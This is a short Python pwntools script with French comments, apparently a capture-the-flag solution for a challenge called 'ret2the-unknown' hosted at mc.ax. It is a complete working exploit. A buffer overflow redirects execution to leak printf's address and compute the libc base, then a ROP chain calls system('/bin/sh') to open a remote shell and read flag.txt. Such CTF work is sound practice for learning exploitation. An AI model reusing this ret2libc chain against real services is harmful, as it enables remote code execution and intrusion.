from pwn import *

binary = ELF('../ret2the-unknown')
libc = ELF('../libc-2.28.so')
context.binary = binary

# il faut 32 bytes pour remplir le buffer + 8 bytes passer par dessus la sauvegarde de rbp
fill_up_buffer = "a" * 32 + "a" * 8

with remote("mc.ax", 31568) as r:
    # on modifie l'adresse de retour du main pour que le programme recommence après nous avoir donné l'adresse de printf
    # ça ne va pas de mettre directement l'adresse de main dans l'adresse de retour, parce que
    # comme notre buffer overflow écrase la sauvegarde de rbp, la stack est positionnée n'importe où après le return du main
    # donc à la place il faut sauter sur "_start" qui est le point d'entrée du programme et qui va donner une valeur correcte à rbp
    rop1 = ROP(binary)
    rop1.raw(fill_up_buffer)
    rop1.call("_start")
    r.sendline(rop1.chain())

    # à partir de l'adresse de printf, on calcule la position de libc dans la mémoire
    r.recvuntil("there: ")
    printf_address = int(r.recvline().strip(), 16)
    libc.address = printf_address - libc.symbols["printf"]

    # comme l'exécution de code dans la stack n'est pas autorisée, on doit faire du rop
    # il y a un string "/bin/sh" dans libc
    # on fait du rop pour :
    # -charger un pointeur sur "/bin/sh" dans rdi (rdi est le registre du premier argument)
    # -appeler la fonction system de libc, qui aura donc un pointeur sur "/bin/sh" comme argument
    rop2 = ROP(libc)
    rop2.raw(fill_up_buffer)
    rop2.system(next(libc.search(b'/bin/sh')))
    print("voilà le contenu qui est envoyé sur la stack :")
    print(rop2.dump())
    r.sendline(rop2.chain())

    # et boum on a un shell sur le serveur !
    r.sendline("cat flag.txt")
    r.stream()